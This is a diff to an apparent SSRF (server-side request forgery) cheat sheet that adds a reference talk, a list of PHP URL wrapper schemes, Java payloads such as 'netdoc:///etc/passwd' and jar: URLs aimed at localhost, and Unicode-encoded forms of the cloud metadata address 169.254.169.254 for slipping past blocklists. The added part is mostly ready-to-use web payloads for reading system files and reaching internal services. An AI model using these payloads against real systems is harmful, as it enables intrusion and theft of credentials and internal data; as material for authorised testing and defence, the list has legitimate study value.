@@ -2,7 +2,7 @@
 
 - SSRF vulns & where to find them by **Detectify** - https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/
 - SSRF attacks via PDF generators by **Nahamsec & Cody Brocious** - https://docs.google.com/presentation/u/0/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/edit
-
+- A new era of SSRF by **Orange Tsai** - https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
 ## Tools -
 
 - SSRFmap - https://github.com/swisskyrepo/SSRFmap
@@ -63,3 +63,46 @@ Sometimes, specific IP addresses are blocked, such as 169.254.169.254. In this c
 - ::ffff:a9fe:a9fe (IPv6)
 
 > Use thsi website to convert IP address to all the 4 types of notation - https://www.abuseipdb.com/tools/ip-address-converter
+
+## SSRF Wrappers / URL Schema
+
+The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled).
+
+```http
+gopher://
+file://
+fd://
+expect://
+ogg://
+tftp://
+dict://
+ftp://
+ssh2://
+file://
+http://
+https://
+imap://
+pop3://
+mailto://
+smtp://
+telnet://
+```
+
+In case of **Java environments**, use these payloads
+
+```http
+netdoc:///etc/passwd
+netdoc:///etc/hosts
+jar:proto-schema://blah!/
+jar:http://localhost!/
+jar:http://127.0.0.1!/
+jar:http://0.0.0.0!/
+jar:ftp://local-domain.com!/
+```
+
+## Enclosed Alphanumeric -
+
+```http
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+```
